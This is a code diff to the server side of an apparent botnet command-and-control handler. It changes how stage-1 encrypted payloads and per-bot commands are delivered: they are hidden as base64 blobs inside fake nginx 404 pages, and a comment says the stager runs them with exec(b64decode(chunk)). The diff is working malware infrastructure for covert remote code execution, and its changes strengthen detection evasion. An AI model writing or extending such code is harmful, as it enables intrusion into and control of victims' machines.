@@ -196,7 +196,11 @@ class OptimizedRequestHandler:
 
         # ========== STEP 3: Handle request type ==========
         if request_type == RequestType.STAGE_1:
-            # Stage 1: generate encrypted payload
+            # Stage 1: generate the encrypted payload, wrap it in the loader
+            # script, and deliver it as a base64 blob inside an otherwise-stock
+            # nginx 404 body.  The stager (bot/launchers/__init__.py) only
+            # parses the body on a 404 and does exec(b64decode(chunk)), so the
+            # status MUST be 404 and the blob MUST be base64-encoded.
             payload_options = data.get("payload_options", {})
             loader_options = data.get("loader_options", {})
 
@@ -208,9 +212,8 @@ class OptimizedRequestHandler:
             wrapped = OptimizedRequestHandler._payload_factory.wrap_loader(
                 loader_name, loader_options, encrypted)
 
-            response = _build_command_response(wrapped)
-            return web.Response(status=200, content_type="text/html",
-                                body=response.encode("latin-1"))
+            payload_b64 = base64.b64encode(wrapped.encode()).decode()
+            return _not_found(request, payload_b64)
 
         elif request_type == RequestType.GET_COMMAND:
             # GET_COMMAND: fetch command from DB
@@ -239,7 +242,7 @@ class OptimizedRequestHandler:
 
             if not has_executed_global:
                 OptimizedRequestHandler._model.add_executed_global(bot_uid)
-                response = _build_command_response(global_command)
+                return _not_found(request, global_command or "")
             else:
                 # Get command from cache or DB (cached result avoids re-query)
                 cmd = OptimizedRequestHandler._model.get_command_raw(bot_uid)
@@ -247,19 +250,11 @@ class OptimizedRequestHandler:
                 if cmd is None:
                     cmd = ""
 
-                response = _build_command_response(cmd)
-
-            # Always return 404 with nginx-compatible body + hidden command channel
-            connection = _connection_for(request)
-            body = response.encode("latin-1")
-            headers = nginx_facade.build_headers(body, 404, "Not Found", connection)
-            return nginx_facade.NginxResponse(body, 404, "Not Found", headers)
+                return _not_found(request, cmd)
 
         else:
-            # Unknown request type — 404 with hidden command
-            response = _build_error_page(request.url)
-            return web.Response(status=404, content_type="text/html",
-                                body=response.encode("latin-1"))
+            # Unknown request type — pristine nginx 404, no command channel.
+            return _not_found(request)
 
 
 def _debug_suffix(command_raw: str = "") -> str:
